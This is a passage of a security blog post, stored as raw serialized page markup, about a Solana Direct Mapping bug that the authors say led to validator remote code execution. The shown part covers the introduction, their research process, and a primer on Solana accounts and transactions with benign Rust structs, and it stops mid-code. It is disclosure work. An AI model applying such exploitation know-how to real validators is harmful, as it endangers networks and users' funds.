hover:prose-a:text-accent2 prose-strong:text-white\",\"children\":[[\"$\",\"div\",null,{\"className\":\"mb-8 border-b border-white/10 pb-6\",\"children\":[[\"$\",\"$L13\",null,{\"href\":\"/blog\",\"className\":\"text-accent1 hover:text-accent2 text-sm mb-4 inline-block\",\"children\":\"← Back to Blog\"}],[\"$\",\"h1\",null,{\"className\":\"text-4xl font-extrabold tracking-tight text-white sm:text-5xl font-urbanist\",\"children\":\"Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing\"}],[\"$\",\"div\",null,{\"className\":\"mt-4 flex items-center gap-x-4 text-sm\",\"children\":[[\"$\",\"time\",null,{\"dateTime\":\"2025-06-27T00:00:00.000Z\",\"className\":\"text-gray-400\",\"children\":\"June 27, 2025\"}],[\"$\",\"span\",null,{\"className\":\"text-gray-500\",\"children\":[\"by \",\"anatomist\"]}]]}]]}],[\"$\",\"style\",null,{\"children\":\"\\n                mjx-container[jax=\\\"SVG\\\"] \u003e svg {\\n                  display: inline !important;\\n                }\\n              \"}],[[\"$\",\"h2\",\"h2-0\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"The Road to RCE\"}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"In this blog, we examine the Direct Mapping optimization first introduced in Solana version 1.16. Our research revealed a critical vulnerability caused by an oversight in pointer management, ultimately allowing us to achieve \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"full remote code execution (RCE) on a validator node\"}],\". This feature was never enabled on mainnet, but had this flaw gone unpatched, it could have compromised the entire Solana network—putting what is today \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"over $9 billion in total value locked (TVL)\"}],\" at risk.\"]}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"In addition to diving into vulnerability details, we want to also \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"demystify the bug-hunting process\"}],\" in this blog. As fascinating as it is to read about all the astonishing findings published by security researchers, rarely do we get a glimpse at the thought process behind. The path to discovering a critical bug is often marked by dead ends, intuition, curiosity, and deep system internals knowledge. By walking through our initial observations and narrowing down the actual vulnerability, we hope to shed light on what real-world vulnerability research looks like.\"]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Before we start, if you're primarily interested in the technical discussions, skip ahead to the \",[\"$\",\"a\",\"a-0\",{\"className\":\"text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"#Setting-the-Stage-A-Primer-on-Solanas-Execution-Environment\",\"children\":\"Setting the Stage: A Primer on Solana's Execution Environment\"}],\" section, where we discuss the background knowledge required to understand the bug. If you know your way around Solana internals and just want to read about the bug, you can jump directly to \",[\"$\",\"a\",\"a-1\",{\"className\":\"text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"#The-Vulnerability\",\"children\":\"The Vulnerability\"}],\" section. Otherwise, sit back and join us as we revisit this rollercoaster of a journey. :)\"]}],\"\\n\",[\"$\",\"h2\",\"h2-1\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"Very Long Story, Hopefully Short Enough\"}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Many blockchains have embraced modern programming languages like Rust and Go, which are often seen as safer alternatives to lower-level options like C or C++. While language choice is sometimes a matter of taste, it significantly shapes a protocol’s security profile. Solana uses Rust, a language renowned for memory safety and object lifetime management.\"}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"But of course, no software is impenetrable. Even before we discovered the RCE vulnerability, our dissection of Solana had already uncovered several validator mismatch bugs that could compromise the chain's liveness. These ranged from non-deterministic execution across multiple validators to misconfigurations in feature gating that led to unsynchronized upgrades. All of which indicate that \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"Solana isn’t bulletproof\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Most of the bugs we previously found leans more to the business logic side. After getting several of these, we are no longer satisfied with unveiling just another business logic bug. We want something deeper, something buried deep in Solana's system internals—\",[\"$\",\"strong\",\"strong-0\",{\"children\":\"the kind you uncover only through the most meticulous anatomy\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"One target we set sight on is the removal of memory address translation, which seems like a powerful, but extremely dangerous optimization. Unfortunately, this feature never materialized.\"}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"While we're keeping watch of the address translation feature, we started exploring adjacent parts of the codebase. It wasn't long before we stumbled upon another interesting feature called Direct Mapping. And it was in this feature we discovered the kind of vulnerability we're looking for, one with the potential to \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"compromise the entire blockchain\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"As you might already know, \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"every performance optimization carries the risk of introducing vulnerabilities\"}],\". The intuitive way to manage VM memory is to isolate it completely from the host running it. This ensures safety but sometimes introduces performance hits. Attempting to eliminate this isolation for speed, while still maintaining security, is ambitious and inherently \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"risky\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Solana began developing the optimization starting with Direct Mapping, especially during Cross-Program Invocations (CPI), when programs must serialize and copy large amounts of account data, resulting in significant execution overhead. The new Direct Mapping mechanism introduced in Solana v1.16 aimed to eliminate unnecessary copying. Account data buffers are directly mapped into VM memory with the pointers dynamically updated rather than copying the entire data. However, this optimization required strict runtime validation of pointers during these dynamic updates, which was inadequately implemented and ultimately introduced the vulnerability.\"}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The vulnerability was powerful, but unfortunately, our exploit hit an unexpected wall thanks to an unrelated patch. After some hard work navigating the new limitations, we ultimately managed to craft a working exploit. Now, if you're ready, let's dive into the technical details.\"}],\"\\n\",[\"$\",\"h2\",\"h2-2\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"Setting the Stage: A Primer on Solana's Execution Environment\"}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"To analyze the security of a system, we first need to understand how it works. Solana is heavily optimized for performance, more specifically, parallel execution of transactions, and requires extra care to prevent race conditions or non-determinism issues that may lead to liveness failures. This results in an object oriented design that incorporating Solana's unique data storage and transaction models.\"}],\"\\n\",[\"$\",\"h3\",\"h3-0\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"The Solana Account Model\"}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"In Solana, everything is stored in what are called \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Accounts\"}],\". You can think of the entire state of the Solana blockchain as a giant key-value store, where the \\\"key\\\" is an \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Address\"}],\" (a \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Pubkey\"}],\") and the \\\"value\\\" is the account data itself.\"]}],\"\\n\",[\"$\",\"p\",\"p-13\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"An \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Account\"}],\" holds several information, most importantly, it tracks the amount of native tokens an account has (\",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"lamports\"}],\"), the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"owner\"}],\" of the account, and an opaque \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"data\"}],\" field.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-0\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Account\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" lamports\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Native token balance\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Variable-length state data\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" owner\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Program authorized to modify this account\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" executable\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Whether this account contains executable code\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" rent_epoch\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Epoch\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Rent tracking information\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-14\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"data\"}],\" field is where the magic happens. For a simple wallet account, this might be empty. But for an account owned by a program, this byte array holds all of its state. The structure of this data is defined by each program. This \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"data\"}],\" field is the central component of our story.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-1\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Transaction and Instruction Flow\"}],\"\\n\",[\"$\",\"p\",\"p-15\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"To take full advantage of storing data as \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Account\"}],\", Solana \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Transaction\"}],\" specify upfront which accounts it intends to access, as well as how it intends to access the accounts (read only or read + write). This allows validators to check if different transactions has overlapping storage access, and decide on whether it is safe to schedule transactions for execution in parallel.\"]}],\"\\n\",[\"$\",\"p\",\"p-16\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Transaction\"}],\" can also include multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instruction\"}],\", each of which is a contract call. This provides a scripting capability for users to perform complex operations in a single transaction. The \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\" in a \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Transaction\"}],\" are executed sequentially and atomically.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-1\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Transaction\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" signatures\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Signature\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" message\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token 